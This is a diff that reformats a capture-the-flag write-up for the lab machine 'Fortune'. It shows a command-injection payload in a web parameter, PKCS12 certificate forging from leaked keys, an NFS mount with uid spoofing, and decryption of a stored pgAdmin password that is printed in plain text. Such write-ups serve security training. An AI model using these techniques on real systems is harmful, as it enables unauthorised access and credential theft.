@@ -1,26 +1,39 @@
+# FORTUNE
+
 10.10.10.127
 
-# Website sends parameter to db and allows appending of commands
->>> db=fortunes ; whoami
+# USER
 
-# The binary seems to be run from the webpage
->>> /usr/games/fortune
+Website sends parameter to db and allows appending of commands
 
-# We find a directory of certificates using the intermediate certificates we can make a pk12 cert that
-# user authenticates us
->>> openssl pkcs12 -export -inkey intermediate.key.pem -in intermediate.cert.pem -out intermediate.p12
+```
+db=fortunes ; whoami
+```
 
-# This provides us with a page to create ssh certs
+The binary seems to be run from the webpage
+```
+/usr/games/fortune
+```
 
-# Page greets us with:
+We find a directory of certificates using the intermediate certificates we can make a pk12 cert that user authenticates us for the ```https``` endpoint
+```
+openssl pkcs12 -export -inkey intermediate.key.pem -in intermediate.cert.pem -out intermediate.p12
+```
 
-    You will need to use the local authpf service to obtain elevated network access. 
-    If you do not already have the appropriate SSH key pair, then you will need to 
-    generate one and configure your local system appropriately to proceed.
+This provides us with a page to create ssh certs
 
-# This is a service that seems to allow traffic out a new nmap scan gives us:
+Page greets us with:
 
->>> ssh nfsuser@10.10.10.127
+```
+You will need to use the local authpf service to obtain elevated network access. 
+If you do not already have the appropriate SSH key pair, then you will need to 
+generate one and configure your local system appropriately to proceed.
+```
+
+This is a service that seems to allow traffic out a new nmap scan gives us:
+
+```
+$ ssh nfsuser@10.10.10.127
 
 Nmap scan report for 10.10.10.127
 Host is up (0.094s latency).
@@ -52,31 +65,45 @@ PORT     STATE SERVICE    VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 130.86 seconds
+```
 
-# /etc/exports just has "home" in it?
-# it allows us to mount the home directory, this gives us write access in the
-# nfsuser directory?
+/etc/exports just has "home" in it?
+it allows us to mount the home directory, this gives us write access in the nfsuser directory
 
-# Can get the flag from Charlie's directory. 
-# By adding the key we received earlier we can get onto ssh with Charlie
+```
+sudo mount -t nfs 10.10.10.127:home /mnt
+```
 
->>> sudo mount -t nfs 10.10.10.127:home /mnt
+Note: adding a user called ```Charlie``` with the same ```uid``` allows us to view the contents of the NFS share
+
+Can get the flag from Charlie's directory. 
+By adding the key we received earlier we can get onto ssh with Charlie
+
 
 # ROOT
 
 /usr/local/pgadmin4
 /usr/local/pgadmin4/.virtualenvs/pgadmin4
-
 /var/appsrv/pgadmin4
 
-# Need to look at how the passwords are encrypted
+Need to look at how the passwords are encrypted
 
->>> from pgadmin.utils.crypto import encrypt, decrypt, pqencryptpassword
+```
+from pgadmin.utils.crypto import encrypt, decrypt, pqencryptpassword
+```
 
-# The password we need to decrypt:
+The password we need to decrypt:
 
->>> utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
+```
+utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
+```
 
-# Using the python decrypt file we get:
+The password is encrypted using AES with the password hash as the key
 
->>> R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+Using the python decrypt file we get:
+
+```
+R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+```
+
+This lets us ssh as root and obtain the flag
